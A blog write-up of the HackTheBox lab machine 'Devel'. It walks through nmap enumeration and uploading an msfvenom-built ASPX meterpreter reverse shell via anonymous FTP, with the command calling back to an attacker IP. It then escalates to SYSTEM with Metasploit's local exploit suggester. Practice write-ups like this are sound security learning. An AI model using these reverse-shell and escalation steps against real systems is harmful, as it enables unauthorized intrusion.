---
layout: single
title: "Devel - Windows HacktheBox Writeup"
categories:
  - Writeup
tags:
  - Easy
  - Windows
  - HackTheBox
classes:
  - wide
---

Today's box is Devel. A Windows box rated easy on HacktheBox. 
This box focused on taking advantage of the FTP anonymous login credentials. Once we have a shell, we can use a exploit suggester on Metasploit to try and privesc and get the system.   


Here are my notes/my writeup for the box:

**ENUMERATION**

Nmap shows us the following: 
```
PORT   STATE SERVICE VERSION

21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT

80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
First thing I notice, is that we can anonymously log in to FTP. 

We can also visit the website. We just see what looks like a default IIS page.   

**FOOTHOLD**

Let's try log in with FTP anonymous. This works!
First thing we see, are the same files that appear in the Nmap reckon. These actually also tell us that the FTP server is likely in the same root as the HTTP server (because the directory of the website are the files in the FTP server). 
We can quickly test to see if we can add files to this server by uploading one from our terminal.
This works, and we can read it too.
*Note to self: I was only able to read the file if I added the HTML extension to the name.* 

With this information, we'll probably be able to upload a reverse shell to the server.
We know from the Nmap scan that the web server is running Microsoft IIS httpd 7.5. So after a bit of researching, we find out that this version most likely supports ASP.NET. This is great because our Nmap scan also shows this on the FTP port side.

*NB: 
"ASP.NET is an open-source, server-side web-application framework designed for web development to produce dynamic web pages. It was developed by Microsoft to allow programmers to build dynamic web sites, applications and services."*

We can try and look up an something along the lines of 'FTP asp.net reverse shell'.
So it looks like we can craft a payload using msfvenom.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=4444 -f aspx -o htb2.aspx
``` 
-p is for payload
-f is for the file type in which to put the shell
-o where to save the entire payload

Now we upload the payload to the FTP server. Open up Metasploit as this shell should open up a meterpreter session. set the payload to the same one: windows/meterpreter/reverse_tcp and set the options. We can run it and also load up our file on the web browser side of things. 
```
10.10.10.5/htb2.aspx
```  
Success! A meterpreter session has opened. 
```
meterpreter > sysinfo

Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows

meterpreter > shell

Process 1788 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>   
```
**PRIVILEGE ESCALATION**

When doing this box, I wasn't different tools I could use to escalate privilege on Windows shells. 
So after doing some research, I found out that we could use a module called *'multi/recon/local_exploit_suggester'*. 
So we just background our session and set up this module and run it. 
```
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 35 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

We can see that the exploit range from ones from 2010 to 2016. 
This makes sense because the system used is windows 7, which looked up, was released in 2009
It looks like it hasn't been updated since then.

So I choose the first suggestion as an exploit. 
Running it we become NT AUTHORITY/SYSTEM. 
We have the highest privilege possible. So let's look for these flags!

The first flag was found in the user Babis' Desktop directory. While the system flag was found in the Administrator's Desktop directory. 

This box was great fun, and taught me a lot about using the different modules Metasploit has to offer. I'm starting to grasp the strength of using msfvenom a lot more now, having had to use it multiple times.  